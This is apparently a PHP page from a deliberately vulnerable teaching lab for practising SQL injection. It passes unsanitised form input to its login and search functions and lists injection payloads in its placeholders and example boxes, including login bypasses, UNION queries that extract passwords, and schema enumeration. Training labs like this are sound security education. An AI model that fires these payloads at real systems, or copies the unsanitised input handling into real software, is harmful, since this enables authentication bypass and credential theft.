<?php
require_once 'config.php';
require_once 'VulnerableUserAuth.php';

$auth = new VulnerableUserAuth();
$message = '';
$messageType = '';
$searchResults = [];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'login') {
        $email = $_POST['email'];  // No sanitization for demonstration
        $password = $_POST['password'];  // No sanitization for demonstration
        
        if (empty($email) || empty($password)) {
            $message = 'Please fill in all fields';
            $messageType = 'error';
        } else {
            $result = $auth->vulnerableLogin($email, $password);
            $message = $result['message'];
            $messageType = $result['success'] ? 'success' : 'error';
            
            if ($result['success']) {
                header('Location: vulnerable_dashboard.php');
                exit();
            }
        }
    } elseif ($action === 'search') {
        $searchTerm = $_POST['search_term'];  // No sanitization
        $result = $auth->searchUsers($searchTerm);
        if ($result['success']) {
            $searchResults = $result['data'];
        }
    }
}

// Redirect if already logged in
if ($auth->isLoggedIn()) {
    header('Location: vulnerable_dashboard.php');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Practice - Vulnerable Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            max-width: 1200px;
            width: 100%;
        }

        .auth-container, .practice-container {
            background: white;
            padding: 2.5rem;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .auth-container::before, .practice-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            border-radius: 15px 15px 0 0;
        }

        .warning {
            background: #fff3cd;
            border: 2px solid #ffeaa7;
            color: #856404;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-weight: 500;
        }

        .auth-header, .practice-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .auth-header h2, .practice-header h2 {
            color: #333;
            margin-bottom: 0.5rem;
            font-size: 1.8rem;
            font-weight: 600;
        }

        .auth-header p, .practice-header p {
            color: #666;
            font-size: 0.95rem;
        }

        .message {
            padding: 0.8rem;
            border-radius: 8px;
            margin-bottom: 1rem;
            text-align: center;
            font-size: 0.9rem;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
            font-weight: 500;
            font-size: 0.9rem;
        }

        .form-group input, .form-group textarea {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #fafafa;
            font-family: monospace;
        }

        .form-group input:focus, .form-group textarea:focus {
            outline: none;
            border-color: #e74c3c;
            background: white;
            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.1);
        }

        .auth-btn {
            width: 100%;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 0.8rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 1rem;
        }

        .auth-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(231, 76, 60, 0.3);
        }

        .injection-examples {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 1rem;
            margin-top: 1rem;
        }

        .injection-examples h4 {
            color: #e74c3c;
            margin-bottom: 0.5rem;
        }

        .injection-examples code {
            background: #343a40;
            color: #f8f9fa;
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-size: 0.9rem;
            display: block;
            margin: 0.5rem 0;
            padding: 0.5rem;
            overflow-x: auto;
        }

        .search-results {
            margin-top: 1rem;
        }

        .search-results table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 0.5rem;
        }

        .search-results th, .search-results td {
            border: 1px solid #dee2e6;
            padding: 0.5rem;
            text-align: left;
        }

        .search-results th {
            background: #f8f9fa;
        }

        .safe-link {
            text-align: center;
            margin-top: 1rem;
            padding-top: 1rem;
            border-top: 1px solid #e0e0e0;
        }

        .safe-link a {
            color: #28a745;
            text-decoration: none;
            font-weight: 500;
        }

        .safe-link a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
                gap: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Login Form (Vulnerable) -->
        <div class="auth-container">
            <div class="warning">
                ⚠️ <strong>WARNING:</strong> This is a deliberately vulnerable system for educational purposes only!
            </div>
            
            <div class="auth-header">
                <h2>🔓 Vulnerable Login</h2>
                <p>Practice SQL injection attacks here</p>
            </div>
            
            <?php if (!empty($message)): ?>
                <div class="message <?php echo $messageType; ?>">
                    <?php echo htmlspecialchars($message); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <input type="hidden" name="action" value="login">
                
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="text" id="email" name="email" 
                           value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                           placeholder="Try: admin@example.com' OR '1'='1">
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="text" id="password" name="password" 
                           placeholder="Try: anything' OR '1'='1">
                </div>
                
                <button type="submit" class="auth-btn">Login (Vulnerable)</button>
            </form>
            
            <div class="injection-examples">
                <h4>🎯 Try These SQL Injection Payloads:</h4>
                
                <p><strong>Basic Boolean-based injection (Email field):</strong></p>
                <code>admin@example.com' OR '1'='1</code>
                <code>' OR 1=1 --</code>
                <code>' OR 'a'='a</code>
                
                <p><strong>Union-based injection (Email field):</strong></p>
                <code>' UNION SELECT 1,2,3,4 --</code>
                <code>' UNION SELECT null,username,email,password FROM users --</code>
                
                <p><strong>Comment-based injection:</strong></p>
                <code>admin@example.com' --</code>
                <code>admin@example.com' #</code>
            </div>
            
            <div class="safe-link">
                <a href="login.php">🔒 Go to Secure Version</a>
            </div>
        </div>

        <!-- Search Form (Also Vulnerable) -->
        <div class="practice-container">
            <div class="practice-header">
                <h2>🔍 Vulnerable Search</h2>
                <p>Practice more SQL injection techniques</p>
            </div>
            
            <form method="POST" action="">
                <input type="hidden" name="action" value="search">
                
                <div class="form-group">
                    <label for="search_term">Search Users</label>
                    <input type="text" id="search_term" name="search_term" 
                           value="<?php echo htmlspecialchars($_POST['search_term'] ?? ''); ?>"
                           placeholder="Try: test' UNION SELECT username,password FROM users --">
                </div>
                
                <button type="submit" class="auth-btn">Search (Vulnerable)</button>
            </form>

            <?php if (!empty($searchResults)): ?>
                <div class="search-results">
                    <h4>Search Results:</h4>
                    <table>
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Email</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($searchResults as $result): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($result['username'] ?? 'N/A'); ?></td>
                                    <td><?php echo htmlspecialchars($result['email'] ?? 'N/A'); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
            
            <div class="injection-examples">
                <h4>🎯 Search Injection Examples:</h4>
                
                <p><strong>Extract all users:</strong></p>
                <code>' OR 1=1 --</code>
                
                <p><strong>Union to get passwords:</strong></p>
                <code>test' UNION SELECT username,password FROM users --</code>
                
                <p><strong>Database information:</strong></p>
                <code>' UNION SELECT database(),version() --</code>
                
                <p><strong>Table enumeration:</strong></p>
                <code>' UNION SELECT table_name,column_name FROM information_schema.columns --</code>
            </div>
        </div>
    </div>
</body>
</html>
